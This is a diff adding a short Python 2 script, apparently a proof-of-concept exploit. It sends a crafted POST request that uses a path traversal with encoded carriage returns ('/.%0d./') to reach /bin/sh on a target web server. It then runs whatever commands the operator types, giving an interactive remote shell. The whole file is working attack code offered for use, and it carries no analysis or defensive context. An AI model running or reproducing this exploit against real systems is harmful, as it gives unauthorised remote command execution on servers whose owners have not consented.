@@ -1,0 +1,62 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+# @Time : 2019/10/15 17:12
+# @Author : Mr.Pi
+# @File : cmd.py
+# @Software: PyCharm
+# @Blog : https://3.1415926.top
+# Life is Fantastic.
+
+import socket
+import ssl
+import time
+import urlparse
+import sys
+
+
+def run(cmd, host, port, scheme):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    if scheme == "https":
+        s = ssl.wrap_socket(s)
+    s.connect((host, int(port)))
+    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1' \
+        .format(cmd)
+    s.send(payload)
+    total_data = []
+    begin = time.time()
+    while True:
+        if total_data and time.time() - begin > 2:
+            break
+        elif time.time() - begin > 2:
+            break
+        data = s.recv(4096)
+        if data:
+            total_data.append(data)
+    res = ''.join(total_data)
+    res = res[res.find("Connection: close") + len("Connection: close"):]
+    res = res.strip()
+    s.close()
+    return res
+
+
+def banner():
+    print '''
+    python poc.py http://192.168.1.1
+    '''
+
+
+if __name__ == '__main__':
+    url = sys.argv[1]
+    url = urlparse.urlparse(url)
+    host = url.hostname
+    port = url.port
+    scheme = url.scheme
+    if port is None and scheme == "http":
+        port = 80
+    elif port is None and scheme == "https":
+        port = 443
+    while True:
+        cmd = raw_input("cmd >>>: ")
+        if cmd == "exit":
+            break
+        print run(cmd=cmd, host=host, port=port, scheme=scheme)
